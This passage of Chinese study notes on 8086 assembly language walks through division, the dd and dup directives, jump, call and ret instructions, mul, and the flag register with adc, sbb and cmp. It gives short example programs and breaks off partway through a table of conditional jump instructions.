class="line">含义:(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商</span><br><span class="line">(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数</span><br></pre></td></tr></table></figure><p>编程，利用除法指令计算100001/100</p><p>被除数100001大于65535，不能用ax寄存器存放，所以只能用dx和ax两个寄存器联合存放100001，也就是说要进行16位的除法。除数100小于255，可以在一个8位寄存器中存放，但是因为被除数是32位的，除数应为16位，所以要用一个16位寄存器来存放除数100。</p><p>因为要分别为dx和ax赋100001的高16位值和低16位值，所以应先将100001表示为16进制形式：186A1H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx,1</span><br><span class="line">mov ax,86a1h;(dx)*10000H+(ax)=100001h</span><br><span class="line">mov bx,100</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure><p>程序执行后，(ax)=03E8H(即1000)，(dx)=1(余数为1)</p><h2 id="8-5-伪指令dd"><a href="#8-5-伪指令dd" class="headerlink" title="8.5 伪指令dd"></a>8.5 伪指令dd</h2><p>dd(double word)双字型数据</p><p>用div计算data段中第一个数据除以第二个数据后的结果，商存在第三个数据的存储单元中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">dd 100001</span><br><span class="line">dw 100</span><br><span class="line">dw 0</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,ds:[0];ds:[0]字单元中的低16位存储在ax中</span><br><span class="line">mov dx,ds:[2];ds:[2]字单元中的高16位存储在dx中</span><br><span class="line">div word ptr ds:[4];用dx:ax中的32位数据除以ds:[4]字单元中的数据</span><br><span class="line">mov ds:[6],ax;将商存储在ds:[6]字单元中</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure><h2 id="8-6-dup"><a href="#8-6-dup" class="headerlink" title="8.6 dup"></a>8.6 dup</h2><p>dup是一个操作符，在汇编语言中同db, dw, dd等一样，也是由编译器识别处理的符号。它是和db, dw, dd等数据定义伪指令配合使用，用来进行数据的重复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 3 dup (0);定义了3个字节,它们的值都是0,相当于db 0,0,0</span><br><span class="line">db 3 dup (0,1,2);db 0,1,2,0,1,2,0,1,2</span><br><span class="line">db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;)</span><br></pre></td></tr></table></figure><p>dup使用格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 重复的次数 dup (重复的字节型数据)</span><br><span class="line">dw 重复的次数 dup (重复的字型数据)</span><br><span class="line">dd 重复的次数 dup (重复的双字型数据)</span><br></pre></td></tr></table></figure><h1 id="9-转移指令的原理"><a href="#9-转移指令的原理" class="headerlink" title="9. 转移指令的原理"></a>9. 转移指令的原理</h1><p>可以修改IP，或同时修改CS和IP的指令统称为转移指令。转移指令就是可以控制CPU执行内存中某处代码的指令。</p><p>8086CPU的转移行为有以下几类</p><ul><li>只修改IP时，称为段内转移，比如：jmp ax</li><li>同时修改CS和IP时，称为段间转移，比如：jmp 1000:0</li></ul><p>由于转移指令对IP的修改范围不同，段内转移又分为短转移和近转移</p><ul><li>短转移IP的修改范围为-128~127</li><li>近转移IP的修改范围为-32768~32767</li></ul><p>8086CPU的转移指令分为以下几类</p><ul><li>无条件转移指令(jmp)</li><li>条件转移指令</li><li>循环指令(loop)</li><li>过程</li><li>中断</li></ul><h2 id="9-1-操作符offset"><a href="#9-1-操作符offset" class="headerlink" title="9.1 操作符offset"></a>9.1 操作符offset</h2><p>操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,offset start;相当于mov ax,0(指令长度为3字节)</span><br><span class="line">s:mov ax,offset s;相当于mov ax,3</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>程序在运行中将s处的一条指令复制到s0处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cd:codesg</span><br><span class="line">codesg segment</span><br><span class="line">s:mov ax,bx;mov ax,bx的机器码占两个字节</span><br><span class="line">mov si,offset s</span><br><span class="line">mov di,offset s0</span><br><span class="line">mov ax,cs:[si]</span><br><span class="line">mov cs:[di],ax</span><br><span class="line">s0:nop;nop机器码占一个字节</span><br><span class="line">nop</span><br><span class="line">codesg ends</span><br><span class="line">end s</span><br></pre></td></tr></table></figure><h2 id="9-2-jmp指令"><a href="#9-2-jmp指令" class="headerlink" title="9.2 jmp指令"></a>9.2 jmp指令</h2><p>jmp为无条件转移指令，可以指修改IP，也可以同时修改CS和IP。</p><p>jmp指令要给出两种信息：</p><ol><li>转移的目的地址</li><li>转移的距离(段间转移、段内短转移、段内近转移)</li></ol><h3 id="9-2-1-依据位移进行转移的jmp指令"><a href="#9-2-1-依据位移进行转移的jmp指令" class="headerlink" title="9.2.1 依据位移进行转移的jmp指令"></a>9.2.1 依据位移进行转移的jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号(转到标号处执行指令)：(IP)=(IP)+8位位移</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127，向前转移时最多可以越过128个字节，向后转移最多可以越过127个字节。</p><p>CPU在执行jmp指令的时候并不需要转移的目的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">jmp short s</span><br><span class="line">add ax,1</span><br><span class="line">s:inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp near ptr 标号：(IP)=(IP)+16位位移</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段内近转移，它对IP的修改范围为-32768~32767，向前转移时最多可以越过32768个字节，向后转移最多可以越过32767个字节。</p><h3 id="9-2-2-转移的目的地址在指令中的jmp指令"><a href="#9-2-2-转移的目的地址在指令中的jmp指令" class="headerlink" title="9.2.2 转移的目的地址在指令中的jmp指令"></a>9.2.2 转移的目的地址在指令中的jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp far ptr 标号：(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址</span><br></pre></td></tr></table></figure><p>这种格式的jmp指令实现的是段间转移，又称远转移。far ptr指明了指令用标号的段地址和偏移地址修改CS和IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,0</span><br><span class="line">mov bx,0</span><br><span class="line">jmp far ptr s</span><br><span class="line">db 256 dup (0)</span><br><span class="line">s:add ax,1</span><br><span class="line">inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="9-2-3-转移地址在寄存器中的-jmp指令"><a href="#9-2-3-转移地址在寄存器中的-jmp指令" class="headerlink" title="9.2.3 转移地址在寄存器中的 jmp指令"></a>9.2.3 转移地址在寄存器中的 jmp指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 16位reg：(IP)=(16位reg)</span><br></pre></td></tr></table></figure><h3 id="9-2-4-转移地址在内存中的jmp指令"><a href="#9-2-4-转移地址在内存中的jmp指令" class="headerlink" title="9.2.4 转移地址在内存中的jmp指令"></a>9.2.4 转移地址在内存中的jmp指令</h3><p>转移地址在内存中的jmp指令有两种格式：</p><ol><li>jmp word ptr 内存单元地址(段内转移)</li></ol><p>功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(IP)=0123H</p><ol><li>jmp dword ptr 内存单元地址(段间转移)</li></ol><p>功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。</p><p>(CS)=(内存单元地址+2)，(IP)=(内存单元地址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(CS)=0，(IP)=0123h，CS:IP指向0000:0123</p><h2 id="9-3-jcxz指令"><a href="#9-3-jcxz指令" class="headerlink" title="9.3 jcxz指令"></a>9.3 jcxz指令</h2><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jcxz 标号(如果(cx)=0,转移到标号处执行)：当(cx)=0时，(IP)=(IP)+8位位移</span><br><span class="line">if((cx)==0) jmp short 标号;</span><br></pre></td></tr></table></figure><h2 id="9-4-loop指令"><a href="#9-4-loop指令" class="headerlink" title="9.4 loop指令"></a>9.4 loop指令</h2><p>loop指令是循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop 标号((cx)=(cx)-1,如果(cx)≠0，转移到标号处执行)：如果(cx)≠0,(IP)=(IP)+8位位移</span><br><span class="line">(cx)--;</span><br><span class="line">if((cx)!=0) jmp short 标号;</span><br></pre></td></tr></table></figure><h1 id="10-call和ret指令"><a href="#10-call和ret指令" class="headerlink" title="10. call和ret指令"></a>10. call和ret指令</h1><p>call和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP。它们经常被共同用来实现子程序的设计。</p><h2 id="10-1-ret和retf"><a href="#10-1-ret和retf" class="headerlink" title="10.1 ret和retf"></a>10.1 ret和retf</h2><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p><h3 id="10-1-1-ret指令"><a href="#10-1-1-ret指令" class="headerlink" title="10.1.1 ret指令"></a>10.1.1 ret指令</h3><p>CPU执行ret指令时，进行下面2步操作：</p><ol><li>(IP)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li></ol><p>CPU执行ret指令时相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br></pre></td></tr></table></figure><h3 id="10-1-2-retf指令"><a href="#10-1-2-retf指令" class="headerlink" title="10.1.2 retf指令"></a>10.1.2 retf指令</h3><p>CPU执行retf指令时，进行下面4步操作：</p><ol><li>(IP)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li><li>(CS)=((SS)*16+(SP))</li><li>(SP)=(SP)+2</li></ol><p>CPU执行retf指令时相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br></pre></td></tr></table></figure><h2 id="10-2-call指令"><a href="#10-2-call指令" class="headerlink" title="10.2 call指令"></a>10.2 call指令</h2><p>CPU执行call指令时，进行2步操作：</p><ol><li>将当前的IP或CS和IP压入栈中</li><li>转移</li></ol><p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。</p><h3 id="10-2-1-依据位移进行转移的call指令"><a href="#10-2-1-依据位移进行转移的call指令" class="headerlink" title="10.2.1 依据位移进行转移的call指令"></a>10.2.1 依据位移进行转移的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 标号(将当前的IP压栈后，转到标号处执行指令)</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的call指令时，进行如下操作：</p><ol><li>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)</li><li>(IP)=(IP)+16位位移</li></ol><p>CPU执行“call 标号“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><h3 id="10-2-2-转移的目的地址在指令中的call指令"><a href="#10-2-2-转移的目的地址在指令中的call指令" class="headerlink" title="10.2.2 转移的目的地址在指令中的call指令"></a>10.2.2 转移的目的地址在指令中的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call far ptr 标号</span><br></pre></td></tr></table></figure><p>实现的是段间转移。</p><p>CPU执行此种格式的call指令时，进行如下操作：</p><ol><li><p>(sp)=(sp)-2</p><p>((ss)*16+(sp))=(CS)</p><p>(sp)=(sp)-2</p><p>((ss)*16+(sp))=(IP)</p></li><li><p>(CS)=标号所在段的段地址</p><p>(IP)=标号在段中的偏移地址</p></li></ol><p>CPU执行“call far ptr 标号“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><h3 id="10-2-3-转移地址在寄存器中的call指令"><a href="#10-2-3-转移地址在寄存器中的call指令" class="headerlink" title="10.2.3 转移地址在寄存器中的call指令"></a>10.2.3 转移地址在寄存器中的call指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 16位reg</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的call指令时，进行如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(IP)</span><br><span class="line">(IP)=(16位reg)</span><br></pre></td></tr></table></figure><p>CPU执行“call 16位reg“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位reg</span><br></pre></td></tr></table></figure><h3 id="10-2-4-转移地址在内存中的call指令"><a href="#10-2-4-转移地址在内存中的call指令" class="headerlink" title="10.2.4 转移地址在内存中的call指令"></a>10.2.4 转移地址在内存中的call指令</h3><p>转移地址在内存中的call指令有两种格式：</p><ol><li>call word ptr 内存单元地址</li></ol><p>CPU执行“call word ptr 内存单元地址“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(IP)=0123h，(sp)=0EH</p><ol><li>call dword ptr 内存单元地址</li></ol><p>CPU执行“call dword ptr 内存单元地址“时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(CS)=0，(IP)=0123H，(sp)=0CH</p><h2 id="10-3-call和ret的配合使用"><a href="#10-3-call和ret的配合使用" class="headerlink" title="10.3 call和ret的配合使用"></a>10.3 call和ret的配合使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assume cd:code</span><br><span class="line">code segment</span><br><span class="line">start:mov ax,1</span><br><span class="line">mov cx,3</span><br><span class="line">call s</span><br><span class="line">mov bx,ax;(bx)=8</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="10-4-mul指令"><a href="#10-4-mul指令" class="headerlink" title="10.4 mul指令"></a>10.4 mul指令</h2><p>mul指令是乘法指令，使用mul做乘法时要注意两点：</p><ol><li>两个相乘的数：要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存字单元中</li><li>结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中存放</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul 内存单元</span><br><span class="line"></span><br><span class="line">mul byte ptr ds:[0]</span><br><span class="line">含义：(ax)=(al)*((ds)*16+0)</span><br><span class="line"></span><br><span class="line">mul word ptr [bx+si+8]</span><br><span class="line">含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位</span><br><span class="line"> (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位</span><br></pre></td></tr></table></figure><p>计算100*10。(100和10小于255，可以做8位乘法)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure><p>结果：(ax)=1000(03E8H)</p><p>计算100*10000。(100小于255，但10000大于255，所以必须做16位乘法)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure><p>结果：(ax)=4240h，(dx)=000FH（F4240H=1000000）</p><h1 id="11-标志寄存器"><a href="#11-标志寄存器" class="headerlink" title="11. 标志寄存器"></a>11. 标志寄存器</h1><p>标志寄存器作用：</p><ol><li>用来存储相关指令的某些执行结果</li><li>用来为CPU执行相关指令提供行为依据</li><li>用来控制CPU的相关工作方式</li></ol><p>flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。</p><div class="table-container"><table><thead><tr><th>15</th><th>14</th><th>13</th><th>12</th><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td>OF</td><td>DF</td><td>IF</td><td>TF</td><td>SF</td><td>ZF</td><td></td><td>AF</td><td></td><td>PF</td><td></td><td>CF</td></tr></tbody></table></div><p>8086中flag寄存器只有标注的这些位有特殊的含义，其它8086CPU没有使用。</p><h2 id="11-1-ZF标志"><a href="#11-1-ZF标志" class="headerlink" title="11.1 ZF标志"></a>11.1 ZF标志</h2><p>flag的第6位是ZF，零标志位。它记录相关指令执行后，其结果是否为0。如果为0，ZF=1；否则ZF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><p>执行后，(ax)=0，ZF=1</p><h2 id="11-2-PF标志"><a href="#11-2-PF标志" class="headerlink" title="11.2 PF标志"></a>11.2 PF标志</h2><p>flag的第2位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，PF=1；否则PF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure><p>执行后，结果为11=00001011B，其中有3个1，PF=0</p><h2 id="11-3-SF标志"><a href="#11-3-SF标志" class="headerlink" title="11.3 SF标志"></a>11.3 SF标志</h2><p>flag的第7位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负，SF=1；否则SF=0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B;al=-127</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure><p>结果：(al)=10000010B，SF=1</p><h2 id="11-4-CF标志"><a href="#11-4-CF标志" class="headerlink" title="11.4 CF标志"></a>11.4 CF标志</h2><p>flag的第0位是CF，进位标志位。一般情况下，在进行<strong>无符号数运算</strong>时，它记录了运算结果的最高有效位向更高位的进位值，或从更高位借位。</p><div class="table-container"><table><thead><tr><th></th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td></td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td></tr><tr><td>假想的更高位</td><td>最高有效位</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>当两数相加时，有可能产生从最高有效位向更高位的进位。CPU在运算的时候，并不丢弃这个进位值，而是记录在一个特殊的寄存器的某一位上。8086CPU就用flag的CF位来记录这个进位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al;98h+98h=130h=0001 0011 0000B</span><br></pre></td></tr></table></figure><p>执行后，(al)=30H，CF=1，CF记录了从最高有效位向更高位的进位值。</p><h2 id="11-5-OF标志"><a href="#11-5-OF标志" class="headerlink" title="11.5 OF标志"></a>11.5 OF标志</h2><p>flag的第11位是OF，溢出标志位。一般情况下，OF记录了<strong>有符号数运算</strong>的结果是否发生了溢出。如果发生溢出，OF=1；否则OF=0。</p><p>对于8位的有符号数据，机器所能表示的范围就是-128~127；对于16位的有符号数据，机器所能表示的范围是-32768~32767。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,0F0H;0f0h=240=-16240-128*2=-16</span><br><span class="line">add al,78H;78h=120=-8</span><br></pre></td></tr></table></figure><p>执行后，对于无符号运算，0F0H+78H=168H=0001 0110 1000B，CF=1；对于有符号数，-16-8=-24，OF=0。</p><h2 id="11-6-adc指令"><a href="#11-6-adc指令" class="headerlink" title="11.6 adc指令"></a>11.6 adc指令</h2><p>adc是带进位加法指令，它利用了CF位上记录的进位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>操作对象1=操作对象1+操作对象2+CF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2;(ax)=2</span><br><span class="line">mov bx,1;(bx)=1</span><br><span class="line">sub bx,ax;(bx)=-1=FFFFHCF=1</span><br><span class="line">adc ax,1;(ax)=(ax)+1+CF=4</span><br></pre></td></tr></table></figure><h2 id="11-7-sbb指令"><a href="#11-7-sbb指令" class="headerlink" title="11.7 sbb指令"></a>11.7 sbb指令</h2><p>sbb是带借位减法指令，它利用了CF位上记录的借位值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>操作对象1=操作对象1-操作对象2-CF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H;(bx)=1000h</span><br><span class="line">mov ax,003EH;(ax)=003eh</span><br><span class="line">sub bx,2000H;(bx)=1000h-2000h=F000HCF=1</span><br><span class="line">sbb ax,0020H;(ax)=(ax)-20h-1=1D</span><br></pre></td></tr></table></figure><h2 id="11-8-cmp指令"><a href="#11-8-cmp指令" class="headerlink" title="11.8 cmp指令"></a>11.8 cmp指令</h2><p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp 操作对象1,操作对象2</span><br></pre></td></tr></table></figure><p>计算操作对象1-操作对象2但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,8;(ax)=8</span><br><span class="line">mov bx,3;(bx)=3</span><br><span class="line">cmp ax,bx;(ax)-(bx)=5=0101b</span><br></pre></td></tr></table></figure><p>指令执行后，零标志位ZF=0，奇偶标志位PF=1，符号标志位SF=0，进位标志位CF=0，溢出标志位OF=0</p><p>如果因为溢出导致了实际结果为负，那么逻辑上真正的结果必然为正；反之亦然。</p><h2 id="11-9-检测比较结果的条件转移指令"><a href="#11-9-检测比较结果的条件转移指令" class="headerlink" title="11.9 检测比较结果的条件转移指令"></a>11.9 检测比较结果的条件转移指令</h2><p>除了jcxz指令外，CPU还提供了其他条件转移指令，大多数条件转移指令都检测标志寄存器的相关标志位，根据检测结果来决定是否修改IP。这些条件转移指令通常和cmp相配合使用，类似call和ret配合。</p><p>因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(它们检测ZF、CF的值)和根据有符号数的比较结果进行转移的条件转移指令(SF、OF、ZF)。</p><p>常用的根据无符号数的比较结果进行转移的条件转移指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>全称</th><th>含义</th><th>检测的相关标志位</th></tr></thead><tbody><tr><td>je</td><td>jump equal</td><td>等于则转移</td><td>zf=1</td></tr><tr><td>jne</td><td>jump not 